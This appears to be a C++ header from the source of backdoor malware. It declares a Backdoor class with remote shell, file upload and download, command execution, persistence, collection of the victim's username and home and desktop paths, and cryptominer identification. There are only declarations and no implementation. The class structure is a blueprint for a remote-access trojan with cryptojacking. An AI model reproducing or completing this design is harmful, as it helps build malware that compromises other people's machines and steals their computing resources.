#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include "system.h"
#define LENGTH 512

class Backdoor{
public:
    void menu();
    void shell();
    void upload(const char *);
    void download(const char *);
    std::string get_miner_id();
    std::string get_miner_ip();
    std::string get_miner_info();
    Backdoor(int, Communication *, bool, char *);

private:
    void persistence();
    void get_home_enviroment();
    void get_username();
    void get_desktop_enviroment();
    char * execute_command(const char *);
    Communication * c;
    bool is_server;
    int sock;
    char * client_ip;
    char * miner_id;
    char * user_name;
    char * user_home;
    char * user_desktop;
    char * program_name;
};

#endif